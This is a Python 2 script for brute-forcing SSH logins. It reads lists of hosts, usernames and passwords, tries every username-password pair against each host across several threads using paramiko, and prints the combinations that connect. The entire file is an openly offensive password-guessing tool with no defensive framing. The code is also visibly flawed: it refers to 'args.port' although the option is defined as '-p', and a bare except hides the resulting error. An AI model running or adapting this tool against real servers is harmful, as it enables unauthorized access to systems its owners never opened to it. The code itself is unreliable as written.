import argparse
import paramiko
import itertools
from Queue import Queue
from threading import Thread
from time import sleep


parser = argparse.ArgumentParser(description='Bruteforce ssh by list of passwords and usernames',
                                 epilog="Hello PowerLifter")
parser.add_argument('-i', type=int, default=0, help='interval between connections(default: 0 sec)')
parser.add_argument('-p', type=int, default=22, help='port to connect to(default: 22)')
parser.add_argument('--usernames', default="srnms", type=argparse.FileType("r"), help='file with usernames(default: srnms)')
parser.add_argument('--passwords', default="pswds", type=argparse.FileType("r"), help='file with passwords(default: pswds)')
parser.add_argument('--hosts', default="hsts", type=argparse.FileType("r"), help='file with hosts to connect to(default: hsts)')
parser.add_argument('--threadnum', type=int, default="4", help='number of threads(default: 4)')

args = parser.parse_args()
users = list()
passwords = list()
hosts = list()


def worker(queue):
    while True:
        user, pwd = queue.get()
        for host in hosts:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(host, port=args.port, username=user, password=pwd)
                print host, args.port, user, pwd
            except:
                sleep(args.i)
                next

        queue.task_done()


def main():
    global users, passwords, hosts

    # create Queue(thread-safe)
    queue = Queue()

    # read hosts to thread-safe queue
    for hostline in args.hosts:
        hosts.append(hostline.strip())

    # read all usernames
    for usrline in args.usernames:
        users.append(usrline.strip())

    # read all passwords
    for pwdline in args.passwords:
        passwords.append(pwdline.strip())

    # put all combinations of usernames and passwords to queue
    combos = [combo for combo in itertools.product(users, passwords)]
    queue_size = len(combos)
    for combo in combos:
        queue.put(combo)

    # free some memory in case lists are big
    del users, passwords, combos

    # go threads
    if args.threadnum > queue_size:
        args.threadnum = queue_size

    for i in range(args.threadnum):
        t = Thread(target=worker, args=(queue,))
        t.daemon = True
        t.start()

    queue.join()

    return


if __name__ == "__main__":
    main()
